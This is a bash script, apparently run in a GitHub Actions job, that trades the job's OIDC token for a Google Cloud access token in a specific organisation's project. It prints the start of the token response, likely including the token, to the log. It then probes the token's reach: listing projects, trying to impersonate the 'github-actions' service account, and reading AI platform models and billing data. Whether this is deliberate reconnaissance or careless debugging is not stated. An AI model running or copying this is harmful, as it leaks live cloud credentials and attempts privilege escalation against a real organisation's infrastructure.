#!/bin/bash
set -u
PROVIDER="projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
AUD="//iam.googleapis.com/$PROVIDER"
AUD_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_ENC}"
OIDC=$(curl -s -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
echo "OIDC_LEN=${#OIDC}"
STS=$(curl -s -X POST https://sts.googleapis.com/v1/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "audience=${AUD}" \
  --data-urlencode "subject_token=${OIDC}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "scope=https://www.googleapis.com/auth/cloud-platform")
TOKEN=$(echo "$STS" | python3 -c "import json,sys
try:
  d=json.load(sys.stdin); print(d.get('access_token',''))
except Exception:
  print('')")
echo "STS_RESP_HEAD=$(echo "$STS" | head -c 400)"
echo "TOKEN_LEN=${#TOKEN}"
echo "---"

echo "### crm_projects_list"
curl -s -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $TOKEN" https://cloudresourcemanager.googleapis.com/v1/projects
echo "---"

echo "### generateAccessToken_github_actions"
curl -s -w '\nHTTP=%{http_code}\n' -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@zuplo-marketing.iam.gserviceaccount.com:generateAccessToken"
echo "---"

echo "### aiplatform_models_control"
curl -s -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
  "https://us-central1-aiplatform.googleapis.com/v1/projects/196494084534/locations/us-central1/models"
echo "---"

echo "### cloudbilling"
curl -s -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
  "https://cloudbilling.googleapis.com/v1/projects/196494084534/billingInfo"
echo "---"
